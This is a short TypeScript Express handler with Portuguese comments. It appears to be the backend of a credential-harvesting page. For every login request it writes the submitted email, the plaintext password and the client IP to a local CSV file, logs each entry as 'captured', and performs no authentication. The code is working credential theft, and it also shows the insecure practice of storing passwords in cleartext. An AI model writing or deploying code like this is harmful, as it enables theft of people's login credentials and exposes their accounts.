import { Request, Response } from "express";
import fs from "fs";
import path from "path";

const logsDir = path.join(__dirname, "../../logs");
const logPath = path.join(logsDir, "login.csv");

// Garante que o diretório e o cabeçalho do CSV existam
if (!fs.existsSync(logsDir)) {
  fs.mkdirSync(logsDir);
}
if (!fs.existsSync(logPath)) {
  fs.writeFileSync(logPath, "timestamp,email,password,ip\n");
}

export const registrarLogin = (req: Request, res: Response) => {
  const { email, password } = req.body;

  // Captura IP real respeitando proxies e IPv6/IPv4
  const ip =
    (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() ||
    req.socket.remoteAddress ||
    "";

  const timestamp = new Date().toISOString();
  const log = `"${timestamp}","${email}","${password}","${ip}"\n`;

  fs.appendFile(logPath, log, (err) => {
    if (err) {
      console.error("Erro ao salvar log:", err);
      return res.status(500).send("Erro interno");
    }
    console.log(`Capturado: ${email} de IP ${ip}`);
    return res.status(200).send("Login recebido");
  });
};
